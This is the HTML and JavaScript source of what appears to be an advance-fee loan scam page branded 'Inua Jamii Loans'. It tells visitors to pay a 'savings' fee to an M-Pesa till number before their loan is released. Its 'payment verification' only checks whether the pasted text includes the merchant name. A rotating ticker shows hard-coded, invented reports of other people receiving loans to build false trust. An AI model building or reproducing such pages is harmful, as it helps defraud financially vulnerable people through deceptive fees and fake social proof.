<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loan Eligibility</title>
  <style>
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:600px;margin:20px auto;padding:20px;background:linear-gradient(135deg,#209bde,#94b155)}
    .loan-message{background:linear-gradient(135deg,#55b194,#070930);padding:2px;border-radius:12px;margin:2px 0;box-shadow:0 2px 4px rgba(0,0,0,.1);height:10%;margin-top:4.5%}
    h1{font-size:1em;text-align:center;margin:30px 0;color:greenyellow;font-weight:bold}
    h4{font-size:.8em;text-align:center;margin:30px 20px 0;width:100%;color:#fff}
    .loan-tabless{background:#ddeefa;border-radius:12px;overflow:hidden;box-shadow:0 2px 4px rgba(0,0,0,.1);margin-top:5%;width:100%}
    .loan-tabless .labels{flex:1;padding:11px;background:#ddeefa51;color:#000;width:100%}
    .loan-tabless div{display:flex;border-bottom:1px solid #f0f0f0}
    .loan-tabless div:last-child{border-bottom:none}
    .verify-btnn{background:linear-gradient(135deg,greenyellow,green);color:#070930;font-size:.8em;padding:12px 20px;border-radius:52px;margin-left:35%;font-weight:bold;width:60%;border:none;cursor:pointer}
    .open-modal-btn{background:linear-gradient(135deg,greenyellow,green);color:#000;font-size:1em;padding:8px 10px;border-radius:12px;margin:10px 0;margin-left:5%;font-weight:bold;width:90%;border:none;cursor:pointer}
    .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);display:none;justify-content:center;align-items:center;z-index:1}
    .modal{background:linear-gradient(135deg,#55b194,#072830);padding:2rem;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:90%;max-width:400px;position:relative}
    .close-btn{position:absolute;top:1rem;right:1rem;background:transparent;border:none;font-size:1.5rem;cursor:pointer;color:#fff}
    h2{font-size:1.2em;text-align:center;margin:30px 20px;color:#fff}
    p{color:#fff;margin-bottom:1.5rem;line-height:1.5}
    .input-field{width:100%;padding:.8rem;border:1px solid #ddd;border-radius:6px;margin-bottom:1rem;font-size:1rem;text-align:center}
    .verify-btn{background:linear-gradient(135deg,greenyellow,green);color:#070930;font-size:1.2em;padding:12px 20px;border-radius:52px;margin:10px 0;margin-left:10%;font-weight:bold;width:80%;border:none;cursor:pointer}
    .message{display:none;margin-top:1rem;padding:.8rem;border-radius:6px;text-align:center}
    .success{background:#e8f5e9;color:#2e7d32}
    .error{background:#ffebee;color:#c62828}
    .footer{text-align:center;margin-top:20px;font-size:.9em;color:wheat}
    .top-ticker{background:linear-gradient(135deg,#fff,#fff);color:#070930;text-align:center;border-radius:8px;padding:.5rem;font-size:.9em}
    .action-row{display:flex;gap:8px;align-items:center}
    .change-btn{background:linear-gradient(135deg,#31463f,#070930);color:orangered;font-size:medium;padding:10px 14px;border-radius:25px;border:none;cursor:pointer;margin:12px auto;display:block}
  </style>
</head>
<body>
  <div class="top-ticker" id="scrollmsg">ðŸ”Š 0724***689 loaned KES 8,390... 2 mins ago</div>

  <div class="loan-message">
    <h1>ACCOUNT SAVINGS</h1>
    <h4>
      Based on your selected loan amount of
      <strong id="limit">Ksh 7,000</strong>,
      ONE-STEP DIMENSION requires you to save
      <strong id="savingsamount">Ksh 160</strong> (Selected Savings Plan) to your Inua Jamii Loans account.
      This helps strengthen your credit profile. Your savings will be withdrawable exclusively upon successful completion of your first loan repayment cycle.
    </h4>
  </div>

  <button class="change-btn" id="changePlanBtn" onclick="window.location.href='savings.html'">Change Savings Plan</button>

  <div class="loan-tabless">
    <div><div class="labels"><strong style="margin-left:5%;">How to save to your Inua Jamii Loans A/C:</strong></div></div>
    <div><div class="labels">Go to M~Pesa : <strong style="margin-left:5.5%;">M~pesa</strong></div></div>
    <div><div class="labels">Lipa na M~Pesa : <strong style="margin-left:3%;">Buy Goods &amp; Services</strong></div></div>
    <div class="action-row"><div class="labels">Enter Till Number : <strong style="margin-left:2%;">5670816</strong></div></div>
    <div class="action-row"><div class="labels"><button class="verify-btnn" id="copytillBtn" onclick="copyTillNumber()">CLICK TO COPY TILL</button></div></div>
    <div><div class="labels">Enter Amount : <strong id="savingsamountt" style="margin-left:13%;">Ksh 160</strong></div></div>
    <div><div class="labels">Complete Payment : <strong style="margin-left:3%;">Enter M~Pesa Pin</strong></div></div>
    <button class="open-modal-btn" onclick="openVerifyModal()">Verify Payment to Initiate Loan Disbursement</button>
  </div>

  <!-- Modal -->
  <div class="overlay" id="overlay">
    <div class="modal" id="modal">
      <button class="close-btn" onclick="closeModals()">&times;</button>
      <h2>Verify Payments</h2>
      <p>Copy the entire confirmation message you received from M-PESA after making payments and paste in the text field below then click verify button</p>
      <textarea class="input-field" id="mpesaInput" placeholder="Paste M-PESA Message Here" rows="4"></textarea>
      <button class="verify-btn" onclick="verifyTransaction()">VERIFY</button>
      <div id="message" class="message"></div>
    </div>
  </div>

  <div class="footer">Â© Inua Jamii Loans 2025</div>

  <script>
    // ---------- Fill values from localStorage ----------
    const limitEl    = document.getElementById('limit');
    const savingsEl  = document.getElementById('savingsamount');
    const savingsEl2 = document.getElementById('savingsamountt');

    const ksh = (n) => `Ksh ${Number(n).toLocaleString()}`;
    const lims = Number(localStorage.getItem('limit')) || 0;
    const save = Number(localStorage.getItem('saveamount')) || 0;

    if (lims > 0) limitEl.textContent = ksh(lims);
    if (save > 0) {
      savingsEl.textContent  = ksh(save);
      savingsEl2.textContent = ksh(save);
    }

    // Make bold (retain your styling approach)
    limitEl.innerHTML    = `<b>${limitEl.textContent}</b>`;
    savingsEl.innerHTML  = `<b>${savingsEl.textContent}</b>`;
    savingsEl2.innerHTML = `<b>${savingsEl2.textContent}</b>`;

    // ---------- Copy Till ----------
    function copyTillNumber() {
      const tillNumber = '5670816';
      navigator.clipboard.writeText(tillNumber).then(() => {
        const btn = document.getElementById('copytillBtn');
        btn.innerText = "Till number copied!";
      }).catch(err => {
        console.error('Failed to copy text: ', err);
      });
    }

    // ---------- Modal handling ----------
    const overlay = document.getElementById('overlay');
    const modal   = document.getElementById('modal');

    function openVerifyModal(){ overlay.style.display = 'flex'; modal.style.display = 'block'; }
    function closeModals(){ overlay.style.display = 'none'; modal.style.display = 'none'; }

    function verifyTransaction() {
      const input = document.getElementById('mpesaInput').value.trim();
      const messageDiv = document.getElementById('message');
      const name = "ONE-STEP DIMENSION";

      messageDiv.style.display = 'block';

      if (input.length > 0 && input.includes(name)) {
        messageDiv.className = 'message success';
        messageDiv.textContent = 'Transaction verification successful!';
        // Optional: redirect after a short delay
        setTimeout(() => {
          overlay.style.display = 'none';
          modal.style.display = 'none';
          localStorage.setItem('review','true');
          window.location.href = 'reviewpage.html';
        }, 800);
      } else {
        messageDiv.className = 'message error';
        messageDiv.textContent = 'Please enter a valid message';
      }
    }

    // ---------- Simple rotating ticker (kept from your original) ----------
    const scrollmsg = document.getElementById('scrollmsg');
    let t = 1;
    const msgs = [
      "ðŸ”Š 0724***689 loaned KES 8,390... 2 mins ago",
      "ðŸ”Š 0701***111 loaned KES 8,500... 7 mins ago",
      "ðŸ”Š 0745***122 loaned KES 6,495... 36 mins ago",
      "ðŸ”Š 0708***343 loaned KES 4,890... 4 mins ago",
      "ðŸ”Š 0711***602 loaned KES 6,000... 5 mins ago",
      "ðŸ”Š 0797***630 loaned KES 6,090... 21 mins ago",
      "ðŸ”Š 0700***091 loaned KES 15,050... 14 mins ago",
      "ðŸ”Š 0711***368 loaned KES 11,300... 11 mins ago",
      "ðŸ”Š 0720***142 loaned KES 9,500... 27 mins ago",
      "ðŸ”Š 0710***177 loaned KES 6,400... 1 min ago",
      "ðŸ”Š 0794***081 loaned KES 5,005... 8 mins ago",
      "ðŸ”Š 0705***699 loaned KES 7,000... 30 mins ago",
      "ðŸ”Š 0724***004 loaned KES 7,050... 12 mins ago",
      "ðŸ”Š 0710***831 loaned KES 5,390... 23 mins ago"
    ];
    setInterval(()=>{ scrollmsg.textContent = msgs[t % msgs.length]; t++; }, 3800);
  </script>
</body>
</html>
